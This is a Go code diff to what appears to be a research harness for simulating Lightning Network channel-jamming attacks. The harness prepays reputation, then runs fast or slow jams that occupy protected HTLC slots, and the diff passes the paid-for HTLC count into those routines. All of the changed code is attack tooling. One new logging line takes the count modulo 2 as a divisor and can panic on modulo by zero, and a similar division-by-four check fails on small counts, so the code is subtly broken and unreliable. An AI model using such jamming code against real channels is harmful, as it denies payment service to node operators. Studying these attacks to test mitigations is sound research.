@@ -186,7 +186,9 @@ func runAttack(ctx context.Context, graph *GraphHarness,
 	route.Hops[len(route.Hops)-1].ChannelID = finalSCIDs[1].ToUint64()
 
 	log.Print("Paying for reputation to access protected slots")
-	err = buildReputationForProtected(ctx, jammer, route, targetNode, count)
+	htlcCount, err := buildReputationForProtected(
+		ctx, jammer, route, targetNode, count,
+	)
 	if err != nil {
 		return fmt.Errorf("Build protected reputation: %w", err)
 	}
@@ -194,10 +196,11 @@ func runAttack(ctx context.Context, graph *GraphHarness,
 	if stragegy.isSlowJam() {
 		err = slowJamProtected(
 			ctx, jammer, route, time.Minute*10, finalSCIDs[1],
+			htlcCount,
 		)
 	} else {
 		err = fastJamProtectedSlots(
-			ctx, jammer, route, time.Minute*10,
+			ctx, jammer, route, time.Minute*10, htlcCount,
 		)
 	}
 	if err != nil {
@@ -279,7 +282,8 @@ func getRouteForStrategy(ctx context.Context, j *JammingHarness,
 // Dispatches a fast jamming attack against the protected slots, blocking until
 // the desired jamming duration has passed.
 func fastJamProtectedSlots(ctx context.Context, j *JammingHarness,
-	route *lndclient.QueryRoutesResponse, duration time.Duration) error {
+	route *lndclient.QueryRoutesResponse, duration time.Duration,
+	htlcCount int) error {
 
 	var (
 		wg sync.WaitGroup
@@ -340,7 +344,7 @@ func fastJamProtectedSlots(ctx context.Context, j *JammingHarness,
 	}
 
 	// Launch an initial set of payments, watching each one individually.
-	for i := 0; i < 483/2; i++ {
+	for i := 0; i < htlcCount; i++ {
 		rep, err := launchFastJam()
 		if err != nil {
 			log.Printf("Could not launch fast jam %v: %v", i, err)
@@ -356,7 +360,7 @@ func fastJamProtectedSlots(ctx context.Context, j *JammingHarness,
 		// We pause a few seconds to give ourselves some time to process
 		// the payments as they cancel so that we can better
 		// res-dispatch replacements once this initial set resolves.
-		if i%50 == 0 && i != 0 {
+		if i%(htlcCount/4) == 0 && i != 0 {
 			log.Printf("Introducing delay between initial jams: %v", i)
 			select {
 			case <-time.After(time.Second * 5):
@@ -368,7 +372,7 @@ func fastJamProtectedSlots(ctx context.Context, j *JammingHarness,
 	}
 
 	var (
-		totalSent = 483 / 2
+		totalSent = htlcCount
 		loopErr   error
 
 		// Once we've launched our initial set of jams, start the timer
@@ -413,7 +417,7 @@ dispatchLoop:
 			}()
 
 			totalSent++
-			if totalSent%200 == 0 {
+			if totalSent%(htlcCount%2) == 0 {
 				log.Printf("Dispatched: %v fast jams", totalSent)
 			}
 
@@ -433,9 +437,11 @@ dispatchLoop:
 // payments have completed (after the duration provided).
 func slowJamProtected(ctx context.Context, jammer *JammingHarness,
 	route *lndclient.QueryRoutesResponse, duration time.Duration,
-	lastChannel lnwire.ShortChannelID) error {
+	lastChannel lnwire.ShortChannelID, htlcCount int) error {
 
-	protectedChans, err := jamProtected(ctx, jammer, route, duration)
+	protectedChans, err := jamProtected(
+		ctx, jammer, route, duration, htlcCount,
+	)
 	if err != nil {
 		return fmt.Errorf("slow jam protected: %w", err)
 	}
@@ -512,7 +518,8 @@ func getSlowJamHold(ctx context.Context, route *lndclient.QueryRoutesResponse,
 }
 
 func jamProtected(ctx context.Context, j *JammingHarness,
-	route *lndclient.QueryRoutesResponse, holdTime time.Duration) (
+	route *lndclient.QueryRoutesResponse, holdTime time.Duration,
+	count int) (
 	[]jamPair, error) {
 
 	wait, err := getSlowJamHold(ctx, route, j, holdTime)
@@ -521,7 +528,7 @@ func jamProtected(ctx context.Context, j *JammingHarness,
 	}
 
 	var jamChans []jamPair
-	for i := 0; i < 483/2; i++ {
+	for i := 0; i < count; i++ {
 		req := JammingPaymentReq{
 			AmtMsat:         route.TotalAmtMsat - route.TotalFeesMsat,
 			SourceIdx:       0,
@@ -652,9 +659,12 @@ func (p *paymentReport) String() string {
 		p.sourceFailed, p.targetFailed, p.peerFailed, p.htlcReceived)
 }
 
+// buildReputationForProtected prepays reputation to access the protected slots
+// along the route provided, returning the number of HTLCs that are successfully
+// paid for (which should then be used to launch a jam).
 func buildReputationForProtected(ctx context.Context, j *JammingHarness,
 	route *lndclient.QueryRoutesResponse, target route.Vertex,
-	htlcCount int) error {
+	htlcCount int) (int, error) {
 
 	var (
 		// Aim to pay for 10% of our total count of HLTCs each round.
@@ -665,13 +675,14 @@ func buildReputationForProtected(ctx context.Context, j *JammingHarness,
 
 	// Check that we don't have a value so small that we round to 0.
 	if htlcToPay == 0 {
-		return fmt.Errorf("Expected at least 10 htlcs, got: %v", htlcCount)
+		return 0, fmt.Errorf("Expected at least 10 htlcs, got: %v",
+			htlcCount)
 	}
 
 	for {
 		err := prepayHTLCs(ctx, j, htlcToPay, route, target)
 		if err != nil {
-			return err
+			return 0, err
 		}
 
 		htlcsPaidFor += htlcToPay
@@ -680,7 +691,7 @@ func buildReputationForProtected(ctx context.Context, j *JammingHarness,
 		// all of our slots.
 		result, err := probeProtectedAccess(ctx, j, route, htlcCount)
 		if err != nil {
-			return err
+			return 0, err
 		}
 
 		log.Printf("Protected probes: %v. Total paid "+
@@ -696,7 +707,7 @@ func buildReputationForProtected(ctx context.Context, j *JammingHarness,
 				"<= %v on previous attempt",
 				result.htlcReceived, prevReachedDest)
 
-			return nil
+			return result.htlcReceived, nil
 		}
 		prevReachedDest = result.htlcReceived
 
@@ -713,7 +724,7 @@ func buildReputationForProtected(ctx context.Context, j *JammingHarness,
 
 		if htlcToPay == 0 {
 			log.Print("No htlcs failed at target, prepay complete")
-			return nil
+			return result.htlcReceived, nil
 		}
 	}
 }
